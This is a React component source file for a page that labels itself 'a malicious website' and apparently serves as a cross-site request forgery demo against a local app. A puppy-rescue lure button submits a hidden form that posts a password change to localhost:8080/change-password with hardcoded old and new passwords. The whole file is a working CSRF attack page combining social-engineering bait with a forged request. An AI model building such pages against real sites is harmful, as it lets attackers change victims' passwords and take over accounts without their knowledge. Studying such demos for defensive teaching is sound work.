import { useEffect } from 'react';
import puppyImage from './download.jpg';
import './App.css';

function App() {
  const submitForm = () => {
    document.getElementById('csrf_form').submit();
  };

  return (
    <div className="App">
      <header className="App-header">
        <h5>This is a malicious website!</h5>
        <img src={puppyImage} className="App-logo" alt="logo" />
        <h1>This puppy needs help !</h1>
        <button onClick={submitForm}>Save this puppy !</button>
        <form
          action="http://localhost:8080/change-password"
          method="post"
          id="csrf_form"
        >
          <input
            type="hidden"
            name="current_password"
            placeholder="Current Password"
            value="eugene2023!!"
          ></input>
          <input
            type="hidden"
            name="new_password"
            placeholder="New Password"
            value="eugene2023"
          ></input>
          <input
            type="hidden"
            name="confirm_password"
            placeholder="Confirm Password"
            value="eugene2023"
          ></input>
        </form>{' '}
      </header>
    </div>
  );
}

export default App;
